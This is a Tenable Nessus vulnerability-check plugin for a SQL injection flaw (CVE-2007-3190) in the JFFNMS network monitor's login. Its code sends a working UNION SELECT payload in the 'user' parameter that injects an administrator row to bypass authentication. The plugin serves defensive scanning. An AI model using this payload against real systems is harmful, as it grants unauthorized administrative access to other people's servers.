#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(25461);
  script_version("1.25");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2007-3190");
  script_bugtraq_id(24414);

  script_name(english:"JFFNMS auth.php Multiple Parameter SQL Injection");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to a SQL
injection attack.");
  script_set_attribute(attribute:"description", value:
"The remote host is running JFFNMS, an open source network management
and monitoring system. 

The version of JFFNMS on the remote host fails to properly sanitize
user-supplied input to the 'user' parameter before using it in the
'lib/api.classes.inc.php' script in database queries.  If PHP's
'magic_quotes_gpc' setting is disabled, an unauthenticated, remote
attacker can leverage this issue to launch SQL injection attacks
against the affected application, including bypassing authentication
and gaining administrative access to it.");
  script_set_attribute(attribute:"see_also", value:"https://www.nth-dimension.org.uk/pub/NDSA20070524.txt.asc");
  script_set_attribute(attribute:"see_also", value:"https://seclists.org/fulldisclosure/2007/Jun/217");
  script_set_attribute(attribute:"solution", value:
"Upgrade to JFFNMS version 0.8.4-pre3 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2007/06/10");
  script_set_attribute(attribute:"plugin_publication_date", value:"2007/06/12");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:jffnms:just_for_fun_network_management_system");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2022 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_require_keys("www/PHP");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/jffnms", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit the SQL injection flaw to bypass authentication.
  user = string(SCRIPT_NAME, "' UNION SELECT 2,'admin','$1$RxS1ROtX$IzA1S3fcCfyVfA9rwKBMi.','Administrator'--");
  pass = "";

  w = http_send_recv3(method:"GET",
    item:string(
      dir, "/?",
      "user=", urlencode(str:user), "&",
      "file=index&",
      "pass=", pass
    ), 
    port:port
  );
  if (isnull(w)) exit(1, "The web server on port "+port+" did not answer.");
  res = strcat(w[0], w[1], '\r\n', w[2]);

  # If...
  if (
    # the output looks like it's from JFFNMS and...
    ("jffnms=" >< res || "is part of JFFNMS" >< res) &&
    # we get a link to the admin menu
    "src='admin/menu.php" >< res
  )
  {
    security_hole(port);
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
    exit(0);
  }
}
